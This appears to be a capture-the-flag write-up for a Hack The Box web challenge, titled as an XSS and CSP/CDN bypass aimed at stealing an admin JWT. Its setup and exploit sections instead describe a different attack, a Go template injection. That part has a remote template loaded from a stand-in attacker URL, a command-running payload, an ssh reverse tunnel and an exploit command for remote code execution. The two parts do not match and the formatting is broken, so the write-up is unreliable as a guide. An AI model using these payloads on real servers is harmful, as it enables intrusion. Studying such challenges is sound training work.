# XSS > CDN 

## website

<img src= "cursed_party_website.PNG">

## Description

Anytime you see "this will be reviewed" "stored for review" Admin will review" | think XSS attack.
NOTE: Docker file installs google chrome, potentials client-side exploit.![image](https://github.com/RosePwns/HTB_Challenges/assets/109770223/af9a73bf-724d-4cce-b48a-676ae2ec3689)
After reviewing the source code, we can see that on the admin page. We notice the username field is vulnerable to HTML injection because it is piping the user's input to 'safe' without any sanitization.
We can also see that the flag is inside of the JWT. So we need to get the JWT in order to get the flag. 
After inspecting a request, we also see that a CDN is being used in the Content Security Policy.
We can use csp-evaluator to analyze the failures of this CSP:

![image](https://github.com/RosePwns/HTB_Challenges/assets/109770223/065e8432-39aa-4eec-ad10-44246631235d)

## Set Up

1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
2. Apache2 server hosting test.go).
3. Setup file with SSTI payload:
   ```go
    {{.FetchServerInfo "cd /;ls -la"}}
5. Tunnel using `ssh -R 80:localhost:80 localhost.run -i /home/$user/.ssh/id_rsa`.

## Exploit

This Python script automates the exploitation of a server-side template injectiony in the web application. It sends a GET request to a specified vulnerable URL, loading and executing our attacker-controlled template on the target server, resulting in remote code execution. 
   ```python
   python exploit.py http://target-server.com http://attacker-server.com/attacker-template.txt
```
## More Information

[SSTI in GO](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md)
